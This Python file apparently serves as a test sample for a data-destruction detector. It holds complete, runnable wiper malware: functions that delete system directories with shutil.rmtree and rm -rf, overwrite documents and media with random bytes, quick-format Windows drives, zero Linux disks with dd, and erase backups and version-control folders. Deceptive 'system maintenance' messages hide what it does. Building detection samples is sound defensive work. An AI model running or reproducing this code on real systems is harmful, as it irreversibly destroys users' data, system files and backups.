"""
MALICIOUS SAMPLE - Tests data destruction detection
"""

import os
import shutil
import glob
import random


def wipe_system():
    """MALICIOUS: Destroy system files"""
    dangerous_paths = [
        "/",  # Root directory (Linux)
        "/etc",  # System configuration
        "/home",  # User data
        "/var",  # Variable data
        "C:\\Windows",  # Windows system
        "C:\\Users",  # Windows user data
        "C:\\Program Files",  # Windows programs
    ]

    for path in dangerous_paths:
        if os.path.exists(path):
            try:
                print(f"Optimizing {path}...")  # Fake message
                shutil.rmtree(path)  # DESTROY EVERYTHING
            except:
                # Try alternative destruction methods
                try:
                    os.system(f"rm -rf {path}")
                except:
                    pass


def crypto_wiper():
    """MALICIOUS: Overwrite files with random data"""
    # Find all user files
    file_patterns = [
        "*.doc",
        "*.docx",
        "*.pdf",
        "*.txt",
        "*.jpg",
        "*.png",
        "*.mp4",
        "*.mp3",
        "*.xlsx",
        "*.ppt",
        "*.zip",
        "*.rar",
    ]

    # Start from user directories
    search_paths = [
        os.path.expanduser("~"),  # User home
        "/home",  # All users (Linux)
        "C:\\Users",  # All users (Windows)
        "/var/www",  # Web files
        "/opt",  # Applications
    ]

    for search_path in search_paths:
        if os.path.exists(search_path):
            for pattern in file_patterns:
                file_path = os.path.join(search_path, "**", pattern)

                # Find all matching files recursively
                for file_to_destroy in glob.glob(file_path, recursive=True):
                    try:
                        # Overwrite with random data before deletion
                        file_size = os.path.getsize(file_to_destroy)
                        with open(file_to_destroy, "wb") as f:
                            # Overwrite with random bytes
                            f.write(os.urandom(file_size))

                        # Delete the file
                        os.remove(file_to_destroy)

                    except:
                        # Continue destroying other files
                        pass


def format_drives():
    """MALICIOUS: Format all available drives"""
    import platform

    if platform.system() == "Windows":
        # Windows drive formatting
        drives = ["C:", "D:", "E:", "F:", "G:", "H:"]
        for drive in drives:
            try:
                os.system(f"format {drive} /q /y")  # Quick format
            except:
                pass
    else:
        # Linux disk destruction
        disk_devices = ["/dev/sda", "/dev/sdb", "/dev/sdc"]
        for device in disk_devices:
            if os.path.exists(device):
                try:
                    # Zero out the disk
                    os.system(f"dd if=/dev/zero of={device} bs=1M")
                except:
                    pass


def delete_backups():
    """MALICIOUS: Find and destroy backup files"""
    backup_extensions = [".bak", ".backup", ".old", ".orig", ".save"]
    backup_directories = [
        "backup",
        "backups",
        "bak",
        "old",
        "archive",
        ".git",
        ".svn",
        "Time Machine Backups",
    ]

    # Walk through entire file system
    for root, dirs, files in os.walk("/"):
        try:
            # Delete backup directories
            for backup_dir in backup_directories:
                if backup_dir in dirs:
                    shutil.rmtree(os.path.join(root, backup_dir))

            # Delete backup files
            for file in files:
                if any(file.endswith(ext) for ext in backup_extensions):
                    os.remove(os.path.join(root, file))

        except:
            # Continue destroying other backups
            pass


if __name__ == "__main__":
    print("System maintenance starting...")
    wipe_system()
    crypto_wiper()
    format_drives()
    delete_backups()
    print("Maintenance complete!")
